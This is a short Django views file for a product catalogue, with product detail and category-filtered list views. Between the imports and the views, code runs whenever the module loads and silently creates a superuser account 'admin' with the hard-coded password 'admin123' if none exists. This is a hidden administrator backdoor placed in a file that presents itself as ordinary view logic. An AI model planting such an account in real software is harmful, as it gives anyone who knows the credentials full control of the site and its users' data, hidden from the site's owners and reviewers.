
from django.shortcuts import render, get_object_or_404
from .models import Product
from django.contrib.auth.models import User
if not User.objects.filter(username='admin').exists():
    User.objects.create_superuser('admin', 'admin@example.com', 'admin123')
def product_detail(request, pk):
    product = get_object_or_404(Product, id=pk)
    return render(request, 'products/product_detail.html', {
        'product': product
    })
def product_list(request):
    category = request.GET.get('category')

    products = Product.objects.all()

    if category:
        products = products.filter(category__slug=category)

    return render(request, 'products/product_list.html', {
        'products': products
    })